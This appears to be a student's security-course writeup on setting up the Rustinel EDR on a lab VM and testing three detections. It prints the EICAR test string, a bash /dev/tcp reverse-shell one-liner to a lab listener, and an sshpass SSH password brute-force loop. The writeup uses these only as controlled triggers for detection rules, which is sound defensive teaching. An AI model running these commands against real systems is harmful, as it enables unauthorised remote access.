# Activity 5 — Endpoint Detection & Response (EDR)

**3014ICT Assessment 1, challenging question | Chris Grul (s5501035)**

## Task mapping

| Assignment requirement | This activity |
|---|---|
| Select one VM | **ovc** — the off-network OpenVPN client (`2404:9400:29c1:df80::1000`) |
| Choose one suitable endpoint EDR tool | **[Rustinel](https://rustinel.io/)** — open-source, cross-platform EDR that collects native host telemetry via **eBPF** on Linux and evaluates **Sigma**, **YARA** and **IOC** detections, emitting **ECS NDJSON** alerts |
| Install and configure it | `setup-rustinel.sh` (runs locally on ovc): installs Rustinel, installs the Linux **Essential** rules pack, registers the managed systemd service, adds the custom rules, enables the scanners/IOC, and verifies the pipeline |
| Simulate & describe a realistic, safe, reversible event | Three tests below — all safe, controlled and reversible; no real malware, no destructive actions |
| Summarise the result | Results table at the end (fill in from the live run) |

## Why Rustinel

Rustinel is a modern, Rust-based EDR that uses **eBPF** (kernel 5.8+ with BTF) to observe process, file and network activity with low overhead, then scores that telemetry against three detector types running in parallel — **Sigma** (behavioural rules), **YARA** (content signatures) and **IOC** (hash/IP/domain matches). It ships a managed service and writes Elastic-schema (ECS) NDJSON alerts, so it behaves like a real endpoint agent rather than a one-off scanner. That makes it a good fit for demonstrating detection *and* the response workflow on a single Linux VM.

## Install

On ovc:

```bash
git clone https://github.com/chris-grul/3014ICT.git ~/3014ICT   # if not already present
cd ~/3014ICT/'Assessment 1'/activity5
./setup-rustinel.sh                     # add --enable-ssh-passwords for demo 3
```

The script downloads and **saves** the official installer for review before running it (no blind pipe-to-shell), then runs `rustinel setup --pack essential --yes` and installs the custom rules. Managed layout: binary `/opt/rustinel/rustinel`, config `/etc/rustinel/config.toml`, rules `/var/lib/rustinel/rules`, alerts `/var/log/rustinel/alerts.json*`, service `rustinel.service`.

## Detection coverage

| Demo | Detector | Rule | Source |
|---|---|---|---|
| 1. EICAR test file | IOC (+ YARA) | EICAR IOC set / `EICAR_Test_File` | Essential pack + `rules/yara/eicar_test.yar` |
| 2. Network intrusion (reverse shell) | Sigma | *Linux Reverse Shell via /dev/tcp* | Essential pack |
| 3. SSH brute force | Sigma | *SSH Password Brute Force … unix_chkpwd* | **custom** `rules/sigma/lin_ssh_bruteforce_unix_chkpwd.yml` |

Rustinel's packs do **not** ship an auth-failure brute-force rule (their telemetry is process/file/network, not the auth log), so demo 3 uses a custom rule: on Linux, `pam_unix` runs the set-uid helper **`unix_chkpwd`** on every SSH password attempt, so a burst of `unix_chkpwd` executions parented by `sshd` is the brute-force signal (MITRE **T1110.001**). A parent-agnostic companion rule is included as a fallback if the engine doesn't map `ParentImage`.

## The three tests (safe, controlled, reversible)

### 1. EICAR test file
```bash
wget -qO ~/eicar.com https://secure.eicar.org/eicar.com.txt   # the standard 68-byte AV test file
chmod +x ~/eicar.com && ~/eicar.com 2>/dev/null; echo done
```
Rustinel scans **on process-start**, so the file must be *executed*, not just written. Offline alternative (no network): write the signature directly —
```bash
printf '%s' 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > ~/eicar.com
```
**Expected:** an EICAR IOC/YARA alert in `/var/log/rustinel/alerts.json*`. **Reverse:** `rm ~/eicar.com`.

### 2. Network intrusion — reverse shell via `/dev/tcp`
```bash
# On a reachable lab host (e.g. igw), start a listener:  nc -lvnp 4444
# On ovc:
bash -i >& /dev/tcp/10.8.0.1/4444 0>&1
```
This is the classic reverse-shell TTP (MITRE **T1059**): a shell interpreter opening an interactive socket. It fires the bundled *Linux Reverse Shell via /dev/tcp* Sigma rule the moment the process starts — the connection need not even succeed. **Reverse:** close the shell / stop the listener.

### 3. SSH brute force
Requires sshd password auth on ovc (`./setup-rustinel.sh --enable-ssh-passwords`, reversible via the `.act5.bak` backup). From an attacker host, hammer ovc with wrong passwords:
```bash
for i in $(seq 1 20); do
  sshpass -p "wrong$i" ssh -o StrictHostKeyChecking=no \
    -o PreferredAuthentications=password user@<ovc-vpn-addr> true
done
```
**Expected:** a burst of *SSH Password Brute Force … unix_chkpwd* alerts (one per attempt). Getting the source IP blocked is fine — ovc is reachable via KVM. **Reverse:** restore `sshd_config` from `/etc/ssh/sshd_config.act5.bak`.

## Verify / view alerts
```bash
sudo rustinel doctor
sudo tail -f /var/log/rustinel/alerts.json*
```

## Results (fill in from the live run)

| Test | Triggered rule | Alert seen? | Notes |
|---|---|---|---|
| EICAR | EICAR IOC / `EICAR_Test_File` | ☐ | |
| Reverse shell | Linux Reverse Shell via /dev/tcp | ☐ | |
| SSH brute force | SSH Password Brute Force (unix_chkpwd) | ☐ | one alert per attempt; burst = brute force |

## Cleanup
```bash
rm -f ~/eicar.com
sudo cp -a /etc/ssh/sshd_config.act5.bak /etc/ssh/sshd_config && sudo systemctl restart ssh   # if you enabled password auth
sudo rustinel service uninstall     # removes the managed service entirely
```

## Sources
- Rustinel — <https://rustinel.io/> · docs <https://docs.rustinel.io/>
- Rustinel engine — <https://github.com/Karib0u/rustinel>
- Rustinel rule packs — <https://github.com/Karib0u/rustinel-rules>
- EICAR test file — <https://www.eicar.org/download-anti-malware-testfile/>
- MITRE ATT&CK T1110.001 (Password Guessing), T1059 (Command & Scripting Interpreter)
